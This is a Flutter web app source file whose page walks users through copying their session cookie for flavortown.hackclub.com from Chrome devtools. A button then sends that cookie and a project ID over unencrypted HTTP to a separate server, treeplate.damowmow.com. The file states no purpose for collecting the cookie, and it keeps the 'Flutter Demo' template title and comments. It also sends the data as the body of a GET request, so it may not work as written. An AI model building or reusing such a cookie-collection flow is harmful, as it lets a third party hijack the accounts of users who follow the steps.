import 'dart:js_interop';

import 'package:flutter/material.dart';
import 'package:web/web.dart' hide Text;

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      theme: ThemeData(
        // This is the theme of your application.
        //
        // TRY THIS: Try running your application with "flutter run". You'll see
        // the application has a purple toolbar. Then, without quitting the app,
        // try changing the seedColor in the colorScheme below to Colors.green
        // and then invoke "hot reload" (save your changes or press the "hot
        // reload" button in a Flutter-supported IDE, or press "r" if you used
        // the command line to start the app).
        //
        // Notice that the counter didn't reset back to zero; the application
        // state is not lost during the reload. To reset the state, use hot
        // restart instead.
        //
        // This works for code too, not just values: Most code changes can be
        // tested with just a hot reload.
        colorScheme: .fromSeed(seedColor: Colors.deepPurple),
      ),
      home: const MyHomePage(title: 'Flutter Demo Home Page'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({super.key, required this.title});

  // This widget is the home page of your application. It is stateful, meaning
  // that it has a State object (defined below) that contains fields that affect
  // how it looks.

  // This class is the configuration for the state. It holds the values (in this
  // case the title) provided by the parent (in this case the App widget) and
  // used by the build method of the State. Fields in a Widget subclass are
  // always marked "final".

  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  String cookie = '';
  String projectID = '';
  @override
  Widget build(BuildContext context) {
    return Column(
      children: [
        Text('Only works on Chrome'),
        SelectableText('1. Go to https://flavortown.hackclub.com/projects'),
        Text('2. Press F12 and go to the network tab'),
        Text('3. Reload'),
        Text(
          '4. Scroll up to the top of the network activity and click "projects"',
        ),
        Text(
          '5. Find "Cookie" and copy the part that says "_flavortown_session_v2=" all the way to the end of the cookie (i think it ends with "%3D%3D"?)',
        ),
        Text('6. Paste that in the text field below:'),
        TextField(
          onChanged: (value) {
            cookie = value;
          },
        ),
        Text('7. Paste one of your project IDs in the text field below:'),
        TextField(
          onChanged: (value) {
            projectID = value;
          },
        ),
        OutlinedButton(onPressed: () {
          var http = XMLHttpRequest();
          http.open('GET', 'http://treeplate.damowmow.com/cookiecgi');
          http.send('$projectID\n$cookie'.toJS);
        }, child: Text('8. Press this button')),
      ],
    );
  }
}
